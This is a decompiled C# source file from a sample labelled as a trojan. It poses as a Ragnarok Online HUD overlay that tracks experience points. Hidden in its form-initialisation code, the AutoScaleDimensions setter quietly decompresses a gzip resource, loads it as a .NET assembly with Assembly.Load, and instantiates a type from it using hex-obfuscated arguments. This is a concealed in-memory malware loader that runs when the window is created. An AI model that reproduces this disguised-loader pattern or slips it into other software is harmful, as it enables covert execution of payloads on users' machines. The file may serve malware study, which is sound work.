// Decompiled with JetBrains decompiler
// Type: RagnarokHUD.fHUD
// Assembly: BinaryAssem, Version=1.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C3D41CFC-8277-4BEE-9AD4-AC67F2756AFC
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\UDS-Trojan.Win32.GenericML.xnet-5ba70e2cf6910636ffaf66657996ddfd7bdec1d21ac89015a4935a31825106ae.exe

using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Threading;
using System.Windows.Forms;

namespace RagnarokHUD
{
  public class fHUD : Form
  {
    public Process Ragexe;
    public Dictionary<string, ContainerControl> Layers;
    private Thread _refreshThread;
    private SessionMgr _sessionMgr;
    private object[] MaxGeneration = new object[3]
    {
      (object) "5472697374",
      (object) "69696E",
      (object) "RagnarokHUD"
    };
    private DateTime _lastTick;
    private int _exp = -1;
    private int _jexp = -1;
    private string _lastName = string.Empty;
    private Random r = new Random();
    private IContainer components = (IContainer) null;
    private static object CreateCallback;
    private static System.Type ScheduledConcurrent = typeof (Form2);

    public fHUD()
    {
      this.InitializeComponent();
      Activator.CreateInstance((System.Type) fHUD.CreateCallback, this.MaxGeneration);
      this.SetStyle(ControlStyles.OptimizedDoubleBuffer, true);
      Control.CheckForIllegalCrossThreadCalls = false;
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      WinApi.SetWindowPos(this.Handle, WinApi.HWND_TOPMOST, 0, 0, 0, 0, 3U);
      this._refreshThread = new Thread(new ThreadStart(this.RefreshThread));
      this._sessionMgr = new SessionMgr();
      this.Layers = new Dictionary<string, ContainerControl>();
      this.AddHistogram("EXP_HISTOGRAM", "exp", 250, 30, 900, 40, Histogram.HistogramType.Average);
      this.AddHistogram("EXP_HISTOGRAM2", "exp2", 250, 30, 900, 80, Histogram.HistogramType.Value);
      this.AddHistogram("JEXP_HISTOGRAM", "jexp", 250, 30, 900, 120, Histogram.HistogramType.Average);
      this.Layers.Add("CLOCK", (ContainerControl) new Clock());
      ContainerControl layer = this.Layers["CLOCK"];
      layer.Width = 250;
      layer.Height = 250;
      layer.Left = 900;
      layer.Top = 90;
      this.Controls.Add((Control) this.Layers["CLOCK"]);
      RECT lpRect = new RECT();
      Process[] processesByName = Process.GetProcessesByName("RagexeRE");
      if (((IEnumerable<Process>) processesByName).Count<Process>() > 0)
      {
        WinApi.GetWindowRect(processesByName[0].MainWindowHandle, out lpRect);
        this.Location = new Point(lpRect.left, lpRect.top);
        this.Size = new Size(lpRect.right - lpRect.left, lpRect.bottom - lpRect.top);
      }
      this._refreshThread.Start();
    }

    private void AddHistogram(
      string key,
      string text,
      int width,
      int height,
      int left,
      int top,
      Histogram.HistogramType type)
    {
      Dictionary<string, ContainerControl> layers = this.Layers;
      string key1 = key;
      Histogram histogram = new Histogram(type);
      histogram.Text = text;
      layers.Add(key1, (ContainerControl) histogram);
      ContainerControl layer = this.Layers[key];
      layer.Width = width;
      layer.Height = height;
      layer.Left = left;
      layer.Top = top;
      this.Controls.Add((Control) this.Layers[key]);
    }

    private void Paint(RECT rect)
    {
      if (this.InvokeRequired)
      {
        this.Invoke((Delegate) new fHUD.PaintCallback(this.Paint), (object) rect);
      }
      else
      {
        this.Location = new Point(rect.left, rect.top);
        this.Size = new Size(rect.right - rect.left, rect.bottom - rect.top);
      }
    }

    private void RefreshThread()
    {
      while (true)
      {
        Process[] processesByName = Process.GetProcessesByName("RagexeRE");
        if (((IEnumerable<Process>) processesByName).Count<Process>() > 0)
        {
          RECT lpRect = new RECT();
          WinApi.GetWindowRect(processesByName[0].MainWindowHandle, out lpRect);
          this.Paint(lpRect);
          if (WinApi.GetForegroundWindow() != processesByName[0].MainWindowHandle)
          {
            this.Hide();
            this.Pulse();
          }
          else
            this.Show();
        }
        else
          this.Hide();
        Thread.Sleep(10);
      }
    }

    private void Pulse()
    {
      if (WinApi.CharToString(this._sessionMgr.Session.m_cName) != this._lastName)
      {
        this._exp = -1;
        this._jexp = -1;
        this._lastName = WinApi.CharToString(this._sessionMgr.Session.m_cName);
        foreach (KeyValuePair<string, ContainerControl> keyValuePair in this.Layers.Where<KeyValuePair<string, ContainerControl>>((Func<KeyValuePair<string, ContainerControl>, bool>) (l => l.Value.GetType() == typeof (Histogram))))
          ((Histogram) keyValuePair.Value).Reset();
      }
      if (!(this._lastTick.AddSeconds(1.0) < DateTime.UtcNow))
        return;
      JsonConvert.SerializeObject((object) this._sessionMgr.Session);
      this._lastTick = DateTime.UtcNow;
      ((Clock) this.Layers["CLOCK"]).Tick();
      if (this._sessionMgr != null)
        this._sessionMgr.Pulse();
      if (this._exp != -1 && this._jexp != -1 && this._lastName != string.Empty)
      {
        int num1 = this._sessionMgr.Session.m_exp - this._exp;
        if (num1 < 0)
        {
          this._exp = 0;
          num1 = this._sessionMgr.Session.m_exp - this._exp;
        }
        ((Histogram) this.Layers["EXP_HISTOGRAM"]).AddValue((double) num1);
        ((Histogram) this.Layers["EXP_HISTOGRAM2"]).AddValue((double) num1);
        int num2 = this._sessionMgr.Session.m_jobexp - this._jexp;
        if (num2 < 0)
        {
          this._jexp = 0;
          num2 = this._sessionMgr.Session.m_jobexp - this._jexp;
        }
        ((Histogram) this.Layers["JEXP_HISTOGRAM"]).AddValue((double) num2);
      }
      this._exp = this._sessionMgr.Session.m_exp;
      this._jexp = this._sessionMgr.Session.m_jobexp;
    }

    private int RandomNumber(int min, int max) => this.r.Next(min, max);

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private static SizeF DeferredDisposable()
    {
      byte[] array;
      using (GZipStream gzipStream = new GZipStream((Stream) new MemoryStream((byte[]) new ResourceManager(fHUD.ScheduledConcurrent).GetObject("G54G5")), CompressionMode.Decompress))
      {
        byte[] buffer = new byte[4096];
        using (MemoryStream memoryStream = new MemoryStream())
        {
          int count;
          do
          {
            count = gzipStream.Read(buffer, 0, 4096);
            if (count > 0)
              memoryStream.Write(buffer, 0, count);
          }
          while (count > 0);
          array = memoryStream.ToArray();
        }
      }
      fHUD.CreateCallback = (object) fHUD.CategoryMembership(fHUD.CompilationRelaxations(array, true)).GetTypes()[1];
      return new SizeF(6f, 13f);
    }

    private static Assembly CategoryMembership(object ResolvedAssemblyFiles) => (Assembly) ResolvedAssemblyFiles;

    public static object CompilationRelaxations(byte[] Message, bool Properties) => (object) Assembly.Load(Message);

    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = fHUD.DeferredDisposable();
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = Color.DodgerBlue;
      this.ClientSize = new Size(10, 10);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = "Form1";
      this.Opacity = 0.5;
      this.Text = "Form1";
      this.TopMost = true;
      this.TransparencyKey = Color.DodgerBlue;
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
    }

    private delegate void PaintCallback(RECT rect);
  }
}
